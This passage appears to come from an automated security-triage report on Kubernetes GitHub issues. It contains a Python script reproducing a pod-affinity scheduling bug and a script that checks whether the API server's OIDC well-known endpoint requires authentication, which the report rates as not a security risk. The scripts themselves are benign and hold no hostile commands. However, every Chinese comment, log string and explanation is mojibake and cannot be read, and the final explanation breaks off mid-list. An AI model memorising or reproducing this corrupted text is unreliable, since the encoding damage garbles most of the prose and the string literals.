                            # å¦‚æœæ¶ˆæ¯æ˜ç¡®æŒ‡å‡ºæ˜¯äº²å’Œæ€§é—®é¢˜ï¼Œåˆ™è®¤ä¸ºå¤ç°æˆåŠŸ
                            if "didn't match pod affinity rules" in condition.message:
                                print(f"\nå¤ç°æˆåŠŸ: Pod {pod_x_name} ä¿æŒ Pending çŠ¶æ€ï¼ŒåŸå› ä¸º Pod äº²å’Œæ€§è§„åˆ™ä¸åŒ¹é…ã€‚")
                                return True # æˆåŠŸå¤ç°é—®é¢˜
            elif phase == "Running":
                print(f"\nå¤ç°å¤±è´¥: Pod {pod_x_name} è¿›å…¥äº† Running çŠ¶æ€ï¼Œä¸é¢„æœŸä¸ç¬¦ã€‚")
                return False # ä¸é¢„æœŸè¡Œä¸ºä¸ç¬¦
            elif phase in ["Succeeded", "Failed", "Unknown"]:
                 print(f"\nå¤ç°å¤±è´¥: Pod {pod_x_name} è¿›å…¥äº† {phase} çŠ¶æ€ã€‚")
                 return False # çŠ¶æ€å¼‚å¸¸

        except ApiException as e:
            print(f"è·å– Pod {pod_x_name} çŠ¶æ€å¤±è´¥: {e}")
            # å¯èƒ½ Pod å°šæœªå®Œå…¨åˆ›å»ºæˆ– API æš‚æ—¶ä¸å¯ç”¨ï¼Œç»§ç»­å°è¯•
        except Exception as e:
            print(f"è·å– Pod {pod_x_name} çŠ¶æ€æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
            return False # å‡ºç°æ„å¤–é”™è¯¯

        time.sleep(10) # æ¯ 10 ç§’æ£€æŸ¥ä¸€æ¬¡

    print(f"\næ£€æŸ¥è¶…æ—¶ ({timeout_minutes} åˆ†é’Ÿ)ã€‚")
    if final_status == "Pending":
         print(f"Pod {pod_x_name} åœ¨è¶…æ—¶åä»å¤„äº Pending çŠ¶æ€ã€‚")
         if "didn't match pod affinity rules" in final_message:
              print("è¶…æ—¶å‰çš„æœ€åçŠ¶æ€ç¬¦åˆé¢„æœŸçš„é—®é¢˜æè¿°ï¼ˆäº²å’Œæ€§è§„åˆ™ä¸åŒ¹é…ï¼‰ã€‚")
              return True # è¶…æ—¶ä½†ç¬¦åˆé¢„æœŸ
         else:
              print(f"è¶…æ—¶å‰çš„æœ€åçŠ¶æ€ä¸º Pendingï¼Œä½†åŸå› ä¸æ˜ç¡®æˆ–ä¸ç¬¦: {final_message}")
              return False
    else:
        print(f"Pod {pod_x_name} åœ¨è¶…æ—¶å‰çš„æœ€åçŠ¶æ€ä¸º {final_status}ï¼Œä¸ç¬¦åˆé¢„æœŸã€‚")
        return False

def main():
    """ä¸»æ‰§è¡Œå‡½æ•°"""
    pods_created = []
    try:
        print("å¼€å§‹å¤ç° Issue ä¸­æè¿°çš„ Pod äº²å’Œæ€§è°ƒåº¦é—®é¢˜...")

        # 1. åˆ›å»º pod-a
        if create_pod(pod_a_manifest, pod_a_name):
            pods_created.append(pod_a_name)
            print("ç­‰å¾… pod-a å¯åŠ¨ç¨³å®š...")
            time.sleep(5) # ç­‰å¾… pod-a ç¨³å®š
        else:
            raise Exception(f"åˆ›å»º {pod_a_name} å¤±è´¥ï¼Œæ— æ³•ç»§ç»­ã€‚")

        # 2. åˆ›å»º pod-b (ä¾èµ– pod-a è°ƒåº¦åˆ°åŒä¸€èŠ‚ç‚¹)
        if create_pod(pod_b_manifest, pod_b_name):
            pods_created.append(pod_b_name)
            print("ç­‰å¾… pod-b å¯åŠ¨ç¨³å®š...")
            time.sleep(5) # ç­‰å¾… pod-b ç¨³å®š
        else:
            raise Exception(f"åˆ›å»º {pod_b_name} å¤±è´¥ï¼Œæ— æ³•ç»§ç»­ã€‚")

        # æ£€æŸ¥ pod-a å’Œ pod-b æ˜¯å¦åœ¨åŒä¸€èŠ‚ç‚¹ (å¯é€‰ä½†æœ‰åŠ©äºç¡®è®¤å‰ææ¡ä»¶)
        try:
            pod_a_node = core_v1_api.read_namespaced_pod(name=pod_a_name, namespace=namespace).spec.node_name
            pod_b_node = core_v1_api.read_namespaced_pod(name=pod_b_name, namespace=namespace).spec.node_name
            if pod_a_node and pod_b_node and pod_a_node == pod_b_node:
                print(f"ç¡®è®¤: {pod_a_name} å’Œ {pod_b_name} éƒ½è¿è¡Œåœ¨èŠ‚ç‚¹ {pod_a_node} ä¸Šã€‚")
            elif pod_a_node and pod_b_node:
                 print(f"è­¦å‘Š: {pod_a_name} ({pod_a_node}) å’Œ {pod_b_name} ({pod_b_node}) ä¸åœ¨åŒä¸€èŠ‚ç‚¹ï¼Œæ— æ³•å¤ç°é—®é¢˜åœºæ™¯ã€‚")
                 # åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œpod-x æœ¬æ¥å°±ä¸åº”è¯¥è¢«è°ƒåº¦ï¼Œä½†è¿™å¹¶éæˆ‘ä»¬è¦å¤ç°çš„ bug
            else:
                 print("è­¦å‘Š: æœªèƒ½è·å– pod-a æˆ– pod-b çš„èŠ‚ç‚¹ä¿¡æ¯ã€‚")
        except ApiException as e:
            print(f"æ£€æŸ¥èŠ‚ç‚¹ä¿¡æ¯æ—¶å‡ºé”™: {e}")


        # 3. åˆ›å»º pod-x
        if create_pod(pod_x_manifest, pod_x_name):
            pods_created.append(pod_x_name)
            print("ç­‰å¾… pod-x è°ƒåº¦...")
            time.sleep(5) # ç»™è°ƒåº¦å™¨ä¸€ç‚¹æ—¶é—´
        else:
            # å¦‚æœåˆ›å»ºå¤±è´¥ (ä¾‹å¦‚APIé”™è¯¯), åˆ™è„šæœ¬å¤±è´¥
             raise Exception(f"åˆ›å»º {pod_x_name} å¤±è´¥ï¼Œæ— æ³•ç»§ç»­ã€‚")


        # 4. æ£€æŸ¥ pod-x æ˜¯å¦ä¿æŒ Pending
        check_pod_x_status(timeout_minutes=2)

    except Exception as e:
        print(f"\nè„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}")
    finally:
        # æ¸…ç†èµ„æº
        print("\nå¼€å§‹æ¸…ç†æµ‹è¯• Pod...")
        # é€†åºåˆ é™¤ï¼Œå…ˆåˆ é™¤ä¾èµ–è€…
        if pod_x_name in pods_created:
            delete_pod(pod_x_name)
        if pod_b_name in pods_created:
            delete_pod(pod_b_name)
        if pod_a_name in pods_created:
            delete_pod(pod_a_name)
        print("æ¸…ç†å®Œæˆã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ä½¿ç”¨`kubernetes` Pythonå®¢æˆ·ç«¯åº“æ¥æ¨¡æ‹ŸIssueä¸­æè¿°çš„åœºæ™¯ï¼š
1.  **åŠ è½½é…ç½®**ï¼šè„šæœ¬é¦–å…ˆå°è¯•åŠ è½½æœ¬åœ°Kubernetesé…ç½®æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ `~/.kube/config`ï¼‰ã€‚
2.  **å®šä¹‰Podæ¸…å•**ï¼šå°†Issueä¸­æä¾›çš„`pod-a`ã€`pod-b`å’Œ`pod-x`çš„YAMLæ¸…å•å®šä¹‰ä¸ºPythonå¤šè¡Œå­—ç¬¦ä¸²ã€‚
3.  **åˆ›å»ºPodå‡½æ•° (`create_pod`)**ï¼šå°è£…äº†ä½¿ç”¨`core_v1_api.create_namespaced_pod`åˆ›å»ºPodçš„é€»è¾‘ï¼Œå¹¶åŒ…å«ç®€å•çš„ç­‰å¾…é€»è¾‘ï¼Œä»¥ç¡®è®¤Podè‡³å°‘è¿›å…¥äº†æŸä¸ªçŠ¶æ€ï¼ˆå¦‚Pendingæˆ–Runningï¼‰ã€‚å¤„ç†äº†Podå·²å­˜åœ¨ï¼ˆ409ï¼‰çš„æƒ…å†µã€‚
4.  **åˆ é™¤Podå‡½æ•° (`delete_pod`)**ï¼šå°è£…äº†ä½¿ç”¨`core_v1_api.delete_namespaced_pod`åˆ é™¤Podçš„é€»è¾‘ï¼Œå¹¶ç­‰å¾…Podç¡®å®è¢«åˆ é™¤ã€‚
5.  **æ£€æŸ¥PodçŠ¶æ€å‡½æ•° (`check_pod_x_status`)**ï¼šåœ¨åˆ›å»ºæ‰€æœ‰Podåï¼Œæ­¤å‡½æ•°ä¼šå®šæœŸï¼ˆæ¯10ç§’ï¼‰æ£€æŸ¥`pod-x`çš„çŠ¶æ€ã€‚å®ƒé¢„æœŸ`pod-x`ä¼šä¿æŒ`Pending`çŠ¶æ€ï¼Œå¹¶ä¸”å…¶`PodScheduled`æ¡ä»¶çš„åŸå› ä¸º`Unschedulable`ï¼Œæ¶ˆæ¯ä¸­åŒ…å«`didn't match pod affinity rules`ã€‚å¦‚æœ`pod-x`è¿›å…¥`Running`çŠ¶æ€ï¼Œæˆ–è€…åœ¨è¶…æ—¶ï¼ˆé»˜è®¤2åˆ†é’Ÿï¼‰åä»å¤„äº`Pending`çŠ¶æ€ä½†åŸå› ä¸ç¬¦ï¼Œåˆ™è®¤ä¸ºå¤ç°å¤±è´¥ã€‚å¦‚æœåœ¨è¶…æ—¶æ—¶é—´å†…è§‚å¯Ÿåˆ°é¢„æœŸçš„`Pending`çŠ¶æ€å’ŒåŸå› ï¼Œåˆ™è®¤ä¸ºæˆåŠŸå¤ç°äº†Issueä¸­æè¿°çš„è¡Œä¸ºã€‚
6.  **ä¸»å‡½æ•° (`main`)**ï¼š
    *   æŒ‰é¡ºåºåˆ›å»º`pod-a`å’Œ`pod-b`ï¼Œå¹¶ç­‰å¾…å®ƒä»¬å¯åŠ¨ã€‚`pod-b`çš„äº²å’Œæ€§è§„åˆ™ç¡®ä¿å®ƒä¼šå°è¯•è°ƒåº¦åˆ°ä¸`pod-a`ç›¸åŒçš„èŠ‚ç‚¹ä¸Šã€‚
    *   ï¼ˆå¯é€‰ï¼‰æ£€æŸ¥`pod-a`å’Œ`pod-b`æ˜¯å¦ç¡®å®åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Œä»¥éªŒè¯æµ‹è¯•å‰æã€‚
    *   åˆ›å»º`pod-x`ï¼Œè¯¥Podå…·æœ‰ä¸¤ä¸ªç¡¬æ€§äº²å’Œæ€§è§„åˆ™ï¼Œè¦æ±‚èŠ‚ç‚¹ä¸ŠåŒæ—¶å­˜åœ¨å¸¦æœ‰`label-1: x`å’Œ`label-2: x`çš„Podã€‚
    *   è°ƒç”¨`check_pod_x_status`æ¥éªŒè¯`pod-x`æ˜¯å¦å¦‚Issueæ‰€è¿°ï¼Œå› äº²å’Œæ€§è§„åˆ™æ— æ³•æ»¡è¶³è€Œä¿æŒ`Pending`çŠ¶æ€ã€‚
    *   ä½¿ç”¨`finally`å—ç¡®ä¿æ— è®ºè„šæœ¬æ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œåˆ›å»ºçš„æµ‹è¯•Podéƒ½ä¼šè¢«æ¸…ç†ã€‚
7.  **æ‰§è¡Œ**ï¼šè„šæœ¬æœ€åç›´æ¥è°ƒç”¨`main()`å‡½æ•°å¼€å§‹æ‰§è¡Œã€‚

è¯¥è„šæœ¬æ—¨åœ¨é€šè¿‡ç¼–ç¨‹æ–¹å¼é‡ç°Issueä¸­æè¿°çš„è°ƒåº¦å™¨è¡Œä¸ºï¼ŒéªŒè¯åœ¨ç‰¹å®šç‰ˆæœ¬çš„Kubernetesä¸­æ˜¯å¦å­˜åœ¨è¯¥åŠŸèƒ½é—®é¢˜ã€‚ç”±äºæ­¤é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œè¯¥è„šæœ¬çš„ä¸»è¦ç›®çš„æ˜¯åŠŸèƒ½éªŒè¯å’Œè°ƒè¯•ã€‚

---


## Issue #130781 Kubernetes OIDC requires authentication for well-known and JWKS endpoints, contrary to OIDC Specification

- Issue é“¾æ¥ï¼š[#130781](https://github.com/kubernetes/kubernetes/issues/130781)

### Issue å†…å®¹

#### What happened?

Kubernetes' OIDC authentication mechanism enforces authentication when querying the OIDC providerâ€™s /.well-known/openid-configuration and JWKS (/keys) endpoints. This behavior contradicts the OIDC specification, which states that these endpoints must be publicly accessible.

The primary issue is that many services supporting resource server authentication (such as RabbitMQ and OpenSearch) rely on OIDC token validation but fail to work with Kubernetes OIDC due to the enforced authentication on these endpoints. These services expect to fetch the discovery and public keys without authentication, as per the OIDC spec, but Kubernetes' behavior prevents this, breaking compatibility with standard OIDC validation flows.

#### What did you expect to happen?

Kubernetes should allow unauthenticated access to these endpoints, as OIDC-compliant providers may not require authentication for retrieving discovery (/.well-known/openid-configuration) and signing keys (/keys).

#### How can we reproduce it (as minimally and precisely as possible)?

1. GET https://api.k8s,example:6443/.well-known/openid-configuration
E.R. get well-known without authentication

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.0
Server Version: v1.30.1

```

</details>


#### Cloud provider

<details>
On Premies
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†Kubernetes APIæœåŠ¡å™¨åœ¨é…ç½®äº†OIDCè®¤è¯æ—¶çš„ä¸€ä¸ªè¡Œä¸ºï¼šè®¿é—®å…¶è‡ªèº«çš„OIDCå‘ç°ç«¯ç‚¹ (`/.well-known/openid-configuration`) å’ŒJWKSç«¯ç‚¹ (`/keys`) æ—¶éœ€è¦è¿›è¡Œèº«ä»½éªŒè¯ã€‚

1.  **é—®é¢˜æ ¸å¿ƒ**ï¼šæ ¹æ®OIDCè§„èŒƒï¼Œèº«ä»½æä¾›è€…ï¼ˆIdPï¼‰çš„è¿™ä¸¤ä¸ªç«¯ç‚¹é€šå¸¸åº”è¯¥æ˜¯å…¬å¼€å¯è®¿é—®çš„ï¼Œä¸éœ€è¦èº«ä»½éªŒè¯ï¼Œä»¥ä¾¿ä¾èµ–æ–¹ï¼ˆRPï¼‰æˆ–èµ„æºæœåŠ¡å™¨ï¼ˆRSï¼‰èƒ½å¤Ÿå‘ç°IdPçš„é…ç½®å’Œç”¨äºéªŒè¯ç­¾åçš„å…¬é’¥ã€‚Kubernetes APIæœåŠ¡å™¨åœ¨è¿™é‡Œè¡¨ç°å¾—åƒä¸€ä¸ªéœ€è¦ä¿æŠ¤å…¶å‘ç°ä¿¡æ¯çš„å®ä½“ï¼Œè¿™ä¸æ ‡å‡†çš„OIDC IdPè¡Œä¸ºä¸ç¬¦ã€‚
2.  **å½±å“**ï¼šä¸»è¦å½±å“æ˜¯ä¸å…¶ä»–æœŸæœ›éµå¾ªOIDCæ ‡å‡†å…¬å¼€ç«¯ç‚¹çš„æœåŠ¡çš„å…¼å®¹æ€§é—®é¢˜ã€‚ä¾‹å¦‚ï¼ŒåƒRabbitMQæˆ–OpenSearchè¿™æ ·çš„æœåŠ¡ï¼Œå¦‚æœå®ƒä»¬è¢«é…ç½®ä¸ºèµ„æºæœåŠ¡å™¨å¹¶éœ€è¦éªŒè¯æ¥è‡ªKubernetes OIDCç”¨æˆ·çš„ä»¤ç‰Œï¼Œå®ƒä»¬ä¼šå°è¯•è®¿é—®Kubernetesï¼ˆä½œä¸ºå…¶ç”¨æˆ·çš„å‘è¡Œè€…ï¼‰çš„JWKSç«¯ç‚¹æ¥è·å–å…¬é’¥ã€‚ç”±äºKubernetesè¦æ±‚å¯¹æ­¤è®¿é—®è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œè¿™äº›æœåŠ¡é€šå¸¸æ‰§è¡Œæœªç»èº«ä»½éªŒè¯çš„è®¿é—®ï¼Œå› æ­¤éªŒè¯æµç¨‹ä¼šå¤±è´¥ã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**ï¼š
    *   è¿™ä¸ªè¡Œä¸ºæœ¬èº«æ˜¯**é™åˆ¶è®¿é—®**ï¼Œè€Œä¸æ˜¯**æš´éœ²è®¿é—®**ã€‚å®ƒè¦æ±‚èº«ä»½éªŒè¯ï¼Œè€Œä¸æ˜¯å…è®¸æœªç»æˆæƒçš„è®¿é—®ã€‚å› æ­¤ï¼Œå®ƒæ²¡æœ‰ç›´æ¥å¼•å…¥å¦‚æœªæˆæƒè®¿é—®ã€ä¿¡æ¯æ³„éœ²ï¼ˆå› ä¸ºè¿™äº›ä¿¡æ¯æŒ‰æ ‡å‡†æœ¬åº”å…¬å¼€ï¼‰æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œç­‰é£é™©ã€‚
    *   å®ƒæ›´åƒæ˜¯ä¸€ä¸ª**åˆè§„æ€§é—®é¢˜**æˆ–**åŠŸèƒ½æ€§ç¼ºé™·**ï¼Œå› ä¸ºå®ƒè¿åäº†OIDCè§„èŒƒçš„æ™®éå®è·µï¼Œå¯¼è‡´äº†äº’æ“ä½œæ€§é—®é¢˜ã€‚
    *   è¯¥é—®é¢˜ä¸ä¼šè®©æ”»å‡»è€…è·å¾—æ›´é«˜çš„æƒé™ï¼Œä¹Ÿä¸ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯ï¼ˆOIDCå‘ç°ä¿¡æ¯å’Œå…¬é’¥è®¾è®¡ä¸Šå°±æ˜¯å…¬å¼€çš„ï¼‰ã€‚
    *   å®ƒä¸å±äºå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜é£é™©ç±»åˆ«ï¼ˆè§„åˆ™7ï¼‰ã€‚
    *   å®ƒä¸æ¶‰åŠä½æƒé™ç”¨æˆ·å½±å“å…¶ä»–ç”¨æˆ·ï¼ˆè§„åˆ™8ï¼‰ã€‚
    *   å®ƒä¸æ¶‰åŠæ—¥å¿—æ³„éœ²å‡­æ®ï¼ˆè§„åˆ™6ï¼‰ã€‚
    *   è™½ç„¶å®ƒå¯èƒ½å¯¼è‡´ä¾èµ–æ­¤åŠŸèƒ½çš„æœåŠ¡æ‹’ç»æœåŠ¡ï¼ˆå› ä¸ºæ— æ³•å®Œæˆè®¤è¯ï¼‰ï¼Œä½†è¿™æ›´åƒæ˜¯é…ç½®å¤±è´¥æˆ–å…¼å®¹æ€§é—®é¢˜å¯¼è‡´çš„åæœï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„DoSæ”»å‡»å‘é‡ã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤è¡Œä¸ºæ¥ä¸»åŠ¨æ”»å‡»å¹¶å¯¼è‡´Kubernetesæˆ–ç›¸å…³æœåŠ¡ä¸å¯ç”¨ï¼Œé™¤éæ”»å‡»è€…å·²ç»æ˜¯æœ‰æƒé™é…ç½®è¿™äº›ä¾èµ–æœåŠ¡çš„ç”¨æˆ·ã€‚

4.  **ç»“è®º**ï¼šè¯¥Issueæè¿°çš„æ˜¯Kubernetesåœ¨OIDCå®ç°ä¸Šä¸è§„èŒƒå®è·µçš„åå·®ï¼Œå¯¼è‡´ä¸å…¶ä»–ç³»ç»Ÿçš„å…¼å®¹æ€§é—®é¢˜ã€‚è¿™æœ¬èº«å¹¶ä¸æ„æˆå¯¹Kubernetesè‡ªèº«çš„å®‰å…¨æ¼æ´ã€‚å®ƒæ²¡æœ‰å¼•å…¥å¯è¢«åˆ©ç”¨æ¥ç ´åç³»ç»Ÿæœºå¯†æ€§ã€å®Œæ•´æ€§æˆ–å¯ç”¨æ€§çš„ç›´æ¥å®‰å…¨é£é™©ã€‚å› æ­¤ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œå®ƒä¸è¢«è§†ä¸ºå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# -*- coding: utf-8 -*-
import contextlib
import time
import requests
import logging
from urllib.parse import urljoin
import urllib3
from kubernetes import client, config
from kubernetes.config.config_exception import ConfigException

# é…ç½®æ—¥å¿—è®°å½•
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ç¦ç”¨ InsecureRequestWarning è­¦å‘Š
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# å…¨å±€è¶…æ—¶è®¾ç½® (ç§’)
REQUEST_TIMEOUT = 30
TOTAL_TIMEOUT = 120 # è„šæœ¬æ€»æ‰§è¡Œè¶…æ—¶

def main():
    """
    ä¸»å‡½æ•°ï¼Œå°è¯•è®¿é—® Kubernetes API Server çš„ OIDC å‘ç°ç«¯ç‚¹ã€‚
    """
    start_time = time.time()
    logging.info("è„šæœ¬å¼€å§‹æ‰§è¡Œ...")

    api_server_url = None
    try:
        # 1. ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        logging.info("å°è¯•ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig...")
        try:
            config.load_kube_config()
            logging.info("kubeconfig åŠ è½½æˆåŠŸã€‚")
        except ConfigException as e:
            logging.error(f"æ— æ³•åŠ è½½ kubeconfig: {e}")
            logging.error("è¯·ç¡®ä¿ kubeconfig æ–‡ä»¶å­˜åœ¨äºé»˜è®¤ä½ç½® (ä¾‹å¦‚ ~/.kube/config) ä¸”é…ç½®æ­£ç¡®ã€‚")
            return
        except Exception as e:
            logging.error(f"åŠ è½½ kubeconfig æ—¶å‘ç”Ÿæ„å¤–é”™è¯¯: {e}")
            return

        # 2. è·å– API Server çš„åœ°å€
        api_client = client.ApiClient()
        api_server_url = api_client.configuration.host
        logging.info(f"è·å–åˆ° Kubernetes API Server åœ°å€: {api_server_url}")

        if not api_server_url:
            logging.error("æœªèƒ½ä» kubeconfig ä¸­è·å– API Server åœ°å€ã€‚")
            return

        # 3. æ„å»º OIDC well-known ç«¯ç‚¹ URL
        # é€šå¸¸ OIDC é…ç½®è·¯å¾„æ˜¯ /.well-known/openid-configuration
        # æ³¨æ„: Issueä¸­æè¿°çš„åœºæ™¯æ˜¯ K8s API Server *æœ¬èº«* çš„ OIDC ç«¯ç‚¹éœ€è¦è®¤è¯ï¼Œ
        # è¿™é€šå¸¸å‘ç”Ÿåœ¨ K8s ä½œä¸º OIDC æä¾›è€…ï¼ˆè™½ç„¶ä¸å¸¸è§ï¼‰æˆ–è€…å…¶èšåˆå±‚æš´éœ²æ­¤ç±»ç«¯ç‚¹æ—¶ã€‚
        # æ›´å¸¸è§çš„æƒ…å†µæ˜¯ K8s *ä½¿ç”¨* å¤–éƒ¨ OIDC æä¾›è€…ï¼Œå…¶å…¬å¼€ç«¯ç‚¹æ˜¯å¤–éƒ¨ IdP çš„ã€‚
        # æ­¤è„šæœ¬å‡è®¾ Issue æè¿°å‡†ç¡®ï¼Œå°è¯•è®¿é—® K8s API Server è‡ªèº«çš„ well-known è·¯å¾„ã€‚
        well_known_path = "/.well-known/openid-configuration"
        target_url = urljoin(api_server_url, well_known_path)
        logging.info(f"å°†è¦è®¿é—®çš„ç›®æ ‡ URL: {target_url}")

        # 4. å‘é€æœªç»èº«ä»½éªŒè¯çš„ GET è¯·æ±‚
        logging.info("å°è¯•å‘é€æœªç»èº«ä»½éªŒè¯çš„ GET è¯·æ±‚...")
        response = None
        try:
            # ä½¿ç”¨ verify=False æ˜¯å› ä¸º K8s API Server é€šå¸¸ä½¿ç”¨è‡ªç­¾åæˆ–å†…éƒ¨ CA è¯ä¹¦
            response = requests.get(target_url, verify=False, timeout=REQUEST_TIMEOUT)

            # 5. æ£€æŸ¥å“åº”çŠ¶æ€ç 
            logging.info(f"æ”¶åˆ°å“åº”çŠ¶æ€ç : {response.status_code}")

            if response.status_code == 200:
                logging.warning(f"æˆåŠŸè®¿é—® {target_url} å¹¶è·å¾— 200 OK å“åº”ã€‚")
                logging.warning("è¿™è¡¨æ˜è¯¥ç«¯ç‚¹æ— éœ€èº«ä»½éªŒè¯å³å¯è®¿é—®ï¼Œä¸ Issue æè¿°ä¸ç¬¦ã€‚")
                try:
                    logging.info("å“åº”å†…å®¹ (å‰ 500 å­—ç¬¦):")
                    logging.info(response.text[:500])
                except Exception as e:
                     logging.error(f"è¯»å–å“åº”å†…å®¹æ—¶å‡ºé”™: {e}")
            elif response.status_code in [401, 403]:
                logging.info(f"è®¿é—® {target_url} éœ€è¦èº«ä»½éªŒè¯ (çŠ¶æ€ç : {response.status_code})ã€‚")
                logging.info("è¿™ç¬¦åˆ Issue ä¸­æè¿°çš„è¡Œä¸ºï¼šKubernetes è¦æ±‚å¯¹ OIDC å‘ç°ç«¯ç‚¹è¿›è¡Œèº«ä»½éªŒè¯ã€‚")
                logging.info("æ­¤è¡Œä¸ºæœ¬èº«ä¸æ˜¯å®‰å…¨æ¼æ´ï¼Œè€Œæ˜¯ä¸ OIDC è§„èŒƒå®è·µçš„åå·®ï¼Œå¯èƒ½å¯¼è‡´å…¼å®¹æ€§é—®é¢˜ã€‚")
            elif response.status_code == 404:
                 logging.warning(f"è®¿é—® {target_url} è¿”å› 404 Not Foundã€‚")
                 logging.warning("è¿™è¡¨æ˜ K8s API Server åœ¨æ­¤è·¯å¾„ä¸‹æ²¡æœ‰é…ç½® OIDC å‘ç°ç«¯ç‚¹ï¼Œæˆ–è€…è·¯å¾„ä¸æ­£ç¡®ã€‚")
            else:
                logging.warning(f"è®¿é—® {target_url} æ”¶åˆ°æ„å¤–çš„çŠ¶æ€ç : {response.status_code}")
                try:
                    logging.info("å“åº”å†…å®¹ (å‰ 500 å­—ç¬¦):")
                    logging.info(response.text[:500])
                except Exception as e:
                    logging.error(f"è¯»å–å“åº”å†…å®¹æ—¶å‡ºé”™: {e}")

        except requests.exceptions.Timeout:
            logging.error(f"è®¿é—® {target_url} è¶…æ—¶ (è¶…è¿‡ {REQUEST_TIMEOUT} ç§’)ã€‚")
        except requests.exceptions.ConnectionError as e:
            logging.error(f"æ— æ³•è¿æ¥åˆ° {target_url}: {e}")
        except requests.exceptions.RequestException as e:
            logging.error(f"è®¿é—® {target_url} æ—¶å‘ç”Ÿé”™è¯¯: {e}")
        finally:
            if response:
                # ç¡®ä¿å…³é—­å“åº”ä½“è¿æ¥
                with contextlib.closing(response):
                    pass

    except Exception as e:
        logging.exception(f"æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿæœªé¢„æ–™çš„é”™è¯¯: {e}") # ä½¿ç”¨ exception è®°å½•å †æ ˆè·Ÿè¸ª

    finally:
        end_time = time.time()
        logging.info(f"è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œæ€»è€—æ—¶: {end_time - start_time:.2f} ç§’ã€‚")
        # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
        if time.time() - start_time > TOTAL_TIMEOUT:
             logging.warning("è„šæœ¬æ‰§è¡Œæ—¶é—´è¶…è¿‡é¢„è®¾çš„æ€»è¶…æ—¶é™åˆ¶ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬æ—¨åœ¨å¤ç°ï¼ˆæˆ–æ›´å‡†ç¡®åœ°è¯´ï¼ŒéªŒè¯ï¼‰Issueä¸­æè¿°çš„è¡Œä¸ºï¼Œå³Kubernetes APIæœåŠ¡å™¨çš„OIDCå‘ç°ç«¯ç‚¹ (`/.well-known/openid-configuration`) å¯èƒ½éœ€è¦èº«ä»½éªŒè¯ã€‚

1.  **åŠ è½½Kubernetesé…ç½®**ï¼šè„šæœ¬é¦–å…ˆå°è¯•ä½¿ç”¨`kubernetes` Pythonåº“ä»é»˜è®¤ä½ç½®ï¼ˆé€šå¸¸æ˜¯ `~/.kube/config`ï¼‰åŠ è½½å½“å‰çš„Kubernetesé›†ç¾¤é…ç½®ã€‚è¿™æ˜¯ä¸ºäº†è·å–ä¸é›†ç¾¤äº¤äº’æ‰€éœ€çš„ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯APIæœåŠ¡å™¨çš„åœ°å€ã€‚
2.  **è·å–APIæœåŠ¡å™¨åœ°å€**ï¼šä»åŠ è½½çš„é…ç½®ä¸­æå–APIæœåŠ¡å™¨çš„URLã€‚
3.  **æ„å»ºç›®æ ‡URL**ï¼šå°†APIæœåŠ¡å™¨çš„URLä¸OIDCå‘ç°ç«¯ç‚¹çš„æ ‡å‡†è·¯å¾„ (`/.well-known/openid-configuration`) ç»“åˆèµ·æ¥ï¼Œå½¢æˆè¦è®¿é—®çš„å®Œæ•´URLã€‚
4.  **æ‰§è¡Œæœªç»è®¤è¯çš„GETè¯·æ±‚**ï¼šä½¿ç”¨`requests`åº“å‘æ„å»ºå¥½çš„URLå‘é€ä¸€ä¸ªHTTP GETè¯·æ±‚ã€‚å…³é”®åœ¨äºè¿™ä¸ªè¯·æ±‚æ˜¯**æœªç»èº«ä»½éªŒè¯**çš„ã€‚åŒæ—¶ï¼Œè®¾ç½®äº†`verify=False`ä»¥å¿½ç•¥TLSè¯ä¹¦éªŒè¯ï¼Œå› ä¸ºæœ¬åœ°ç¯å¢ƒæˆ–ç§æœ‰é›†ç¾¤çš„APIæœåŠ¡å™¨é€šå¸¸ä½¿ç”¨è‡ªç­¾åè¯ä¹¦æˆ–å†…éƒ¨CAè¯ä¹¦ã€‚è®¾ç½®äº†è¯·æ±‚è¶…æ—¶ä»¥é˜²æ­¢æ°¸ä¹…æŒ‚èµ·ã€‚
5.  **åˆ†æå“åº”**ï¼š
    *   æ£€æŸ¥HTTPå“åº”çš„çŠ¶æ€ç ã€‚
